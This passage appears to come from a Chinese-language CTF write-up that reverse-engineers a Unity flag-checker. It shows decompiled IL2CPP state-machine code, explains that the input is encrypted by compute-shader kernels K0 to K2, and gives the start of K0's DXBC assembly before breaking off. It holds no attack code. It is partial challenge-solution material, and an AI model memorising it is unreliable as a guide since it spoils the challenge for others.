</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>sub_180157800</span><span class=p>(</span><span class=o>&amp;</span><span class=n>Method_Controller__Check_b__18_3__</span><span class=p>,</span><span class=w> </span><span class=n>v7</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>sub_180157800</span><span class=p>(</span><span class=o>&amp;</span><span class=n>System_Func_Task__TypeInfo</span><span class=p>,</span><span class=w> </span><span class=n>v8</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>sub_180157800</span><span class=p>(</span><span class=o>&amp;</span><span class=n>System_Func_Task_byte_____TypeInfo</span><span class=p>,</span><span class=w> </span><span class=n>v9</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>sub_180157800</span><span class=p>(</span><span class=o>&amp;</span><span class=n>System_Func_byte____Task__TypeInfo</span><span class=p>,</span><span class=w> </span><span class=n>v10</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>sub_180157800</span><span class=p>(</span><span class=o>&amp;</span><span class=n>int___TypeInfo</span><span class=p>,</span><span class=w> </span><span class=n>v11</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>sub_180157800</span><span class=p>(</span><span class=o>&amp;</span><span class=n>Method_System_Runtime_CompilerServices_TaskAwaiter_byte____GetResult__</span><span class=p>,</span><span class=w> </span><span class=n>v12</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>sub_180157800</span><span class=p>(</span><span class=o>&amp;</span><span class=n>Method_System_Runtime_CompilerServices_TaskAwaiter_byte____get_IsCompleted__</span><span class=p>,</span><span class=w> </span><span class=n>v13</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>sub_180157800</span><span class=p>(</span><span class=o>&amp;</span><span class=n>Method_System_Threading_Tasks_Task_byte____GetAwaiter__</span><span class=p>,</span><span class=w> </span><span class=n>v14</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>byte_180F4C9B1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=o>*</span><span class=p>(</span><span class=no>_QWORD</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>awaiter_</span><span class=p>.</span><span class=n>fields</span><span class=p>.</span><span class=n>m_continueOnCapturedContext</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>awaiter_</span><span class=p>.</span><span class=n>fields</span><span class=p>.</span><span class=n>m_task</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>__4__this</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Il2CppObject</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>this</span>-&gt;<span class=nc>fields</span><span class=p>.</span><span class=n>__4__this</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>switch</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>this</span>-&gt;<span class=nc>fields</span><span class=p>.</span><span class=n>__1__state</span><span class=w> </span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>case</span><span class=w> </span><span class=mi>0</span>:
</span></span><span class=line><span class=cl>      <span class=o>*</span><span class=p>(</span><span class=no>_QWORD</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>awaiter_</span><span class=p>.</span><span class=n>fields</span><span class=p>.</span><span class=n>m_continueOnCapturedContext</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>this</span>-&gt;<span class=nc>fields</span><span class=p>.</span><span class=n>__u__1</span><span class=p>.</span><span class=n>fields</span><span class=p>.</span><span class=n>m_task</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>this</span>-&gt;<span class=nc>fields</span><span class=p>.</span><span class=n>__u__1</span><span class=p>.</span><span class=n>fields</span><span class=p>.</span><span class=n>m_task</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>this</span>-&gt;<span class=nc>fields</span><span class=p>.</span><span class=n>__1__state</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>-</span><span class=mi>1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>goto</span><span class=w> </span><span class=no>LABEL_13</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>case</span><span class=w> </span><span class=mi>1</span>:
</span></span><span class=line><span class=cl>      <span class=nc>awaiter_</span><span class=p>.</span><span class=n>fields</span><span class=p>.</span><span class=n>m_task</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=k>struct</span> <span class=nc>System_Threading_Tasks_Task_TResult__o</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>this</span>-&gt;<span class=nc>fields</span><span class=p>.</span><span class=n>__u__2</span><span class=p>.</span><span class=n>fields</span><span class=p>.</span><span class=n>m_task</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>this</span>-&gt;<span class=nc>fields</span><span class=p>.</span><span class=n>__u__2</span><span class=p>.</span><span class=n>fields</span><span class=p>.</span><span class=n>m_task</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>this</span>-&gt;<span class=nc>fields</span><span class=p>.</span><span class=n>__1__state</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>-</span><span class=mi>1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>goto</span><span class=w> </span><span class=no>LABEL_17</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>case</span><span class=w> </span><span class=mi>2</span>:
</span></span><span class=line><span class=cl>      <span class=nc>awaiter_</span><span class=p>.</span><span class=n>fields</span><span class=p>.</span><span class=n>m_task</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=k>struct</span> <span class=nc>System_Threading_Tasks_Task_TResult__o</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>this</span>-&gt;<span class=nc>fields</span><span class=p>.</span><span class=n>__u__2</span><span class=p>.</span><span class=n>fields</span><span class=p>.</span><span class=n>m_task</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>this</span>-&gt;<span class=nc>fields</span><span class=p>.</span><span class=n>__u__2</span><span class=p>.</span><span class=n>fields</span><span class=p>.</span><span class=n>m_task</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>this</span>-&gt;<span class=nc>fields</span><span class=p>.</span><span class=n>__1__state</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>-</span><span class=mi>1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>goto</span><span class=w> </span><span class=no>LABEL_20</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>case</span><span class=w> </span><span class=mi>3</span>:
</span></span><span class=line><span class=cl>      <span class=nc>awaiter_</span><span class=p>.</span><span class=n>fields</span><span class=p>.</span><span class=n>m_task</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=k>struct</span> <span class=nc>System_Threading_Tasks_Task_TResult__o</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>this</span>-&gt;<span class=nc>fields</span><span class=p>.</span><span class=n>__u__2</span><span class=p>.</span><span class=n>fields</span><span class=p>.</span><span class=n>m_task</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>this</span>-&gt;<span class=nc>fields</span><span class=p>.</span><span class=n>__u__2</span><span class=p>.</span><span class=n>fields</span><span class=p>.</span><span class=n>m_task</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>this</span>-&gt;<span class=nc>fields</span><span class=p>.</span><span class=n>__1__state</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>-</span><span class=mi>1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>goto</span><span class=w> </span><span class=no>LABEL_23</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>case</span><span class=w> </span><span class=mi>4</span>:
</span></span><span class=line><span class=cl>      <span class=nc>awaiter_</span><span class=p>.</span><span class=n>fields</span><span class=p>.</span><span class=n>m_task</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=k>struct</span> <span class=nc>System_Threading_Tasks_Task_TResult__o</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>this</span>-&gt;<span class=nc>fields</span><span class=p>.</span><span class=n>__u__2</span><span class=p>.</span><span class=n>fields</span><span class=p>.</span><span class=n>m_task</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>this</span>-&gt;<span class=nc>fields</span><span class=p>.</span><span class=n>__u__2</span><span class=p>.</span><span class=n>fields</span><span class=p>.</span><span class=n>m_task</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>this</span>-&gt;<span class=nc>fields</span><span class=p>.</span><span class=n>__1__state</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>-</span><span class=mi>1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>goto</span><span class=w> </span><span class=no>LABEL_26</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>case</span><span class=w> </span><span class=mi>5</span>:
</span></span><span class=line><span class=cl>      <span class=nc>awaiter_</span><span class=p>.</span><span class=n>fields</span><span class=p>.</span><span class=n>m_task</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=k>struct</span> <span class=nc>System_Threading_Tasks_Task_TResult__o</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>this</span>-&gt;<span class=nc>fields</span><span class=p>.</span><span class=n>__u__2</span><span class=p>.</span><span class=n>fields</span><span class=p>.</span><span class=n>m_task</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>this</span>-&gt;<span class=nc>fields</span><span class=p>.</span><span class=n>__u__2</span><span class=p>.</span><span class=n>fields</span><span class=p>.</span><span class=n>m_task</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>this</span>-&gt;<span class=nc>fields</span><span class=p>.</span><span class=n>__1__state</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>-</span><span class=mi>1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=n>goto</span><span class=w> </span><span class=no>LABEL_29</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>状态机的加密逻辑很清晰，从case0到case5依次：</p><p>case0：调用Controller___Check_b__18_0_d()：从输入框取字符串，解析出{}包裹的 16 字节 bytes case1：await Controller___Check_b__18_1_d：把这 16 字节写到一张 16×1 的纹理里 case2-case4：await Controller___Check_b__18_2_d连续跑三轮，调用 compute shader 的 kernel K0进行加密 case5：await Controller___Check_b__18_3_d：调用 kernel K1进行逐字节比对，失败写 SharedState 最后 UI 逻辑用 kernel K2 根据 SharedState 显示 Correct/Wrong</p><p>使用AssetRipper提取得到资源文件shader.assets，提取K0 K1 K2三个dxbc。提取后用dxdec反编译得到三个kernel的汇编代码：</p><p>K0:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=n>cs_5_0</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>dcl_globalFlags</span><span class=w> </span><span class=n>refactoringAllowed</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nf>dcl_resource_texture2d</span><span class=w> </span><span class=p>(</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>)</span><span class=w> </span><span class=n>t0</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nf>dcl_uav_typed_texture2d</span><span class=w> </span><span class=p>(</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>)</span><span class=w> </span><span class=n>u0</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>dcl_temps</span><span class=w> </span><span class=n>5</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>dcl_indexableTemp</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>16</span><span class=o>]</span><span class=p>,</span><span class=w> </span><span class=n>4</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>dcl_indexableTemp</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>32</span><span class=o>]</span><span class=p>,</span><span class=w> </span><span class=n>4</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>dcl_thread_group</span><span class=w> </span><span class=n>1</span><span class=p>,</span><span class=w> </span><span class=n>1</span><span class=p>,</span><span class=w> </span><span class=n>1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>1</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>2</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>3</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>4</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>5</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>6</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>7</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>8</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>9</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>10</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>11</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>12</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>13</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>14</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>15</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>16</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>17</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>18</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>19</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>20</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>21</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>22</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>23</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>24</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>25</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>26</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>27</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
